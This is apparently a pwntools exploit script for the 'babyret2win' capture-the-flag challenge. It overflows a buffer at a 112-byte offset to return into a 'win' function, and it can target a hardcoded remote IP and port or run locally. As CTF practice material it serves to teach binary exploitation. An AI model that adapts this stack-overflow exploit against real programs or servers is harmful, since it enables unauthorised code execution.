#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './babyret2win' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
# libc = '/usr/lib/libc.so.6'
# libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '139.59.120.240', 13366 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)

    offset = 112
    payload = flat({
        offset: [
            rop.ret.address,
            elf.sym['win']
        ]
    })
    
    io.sendline(payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()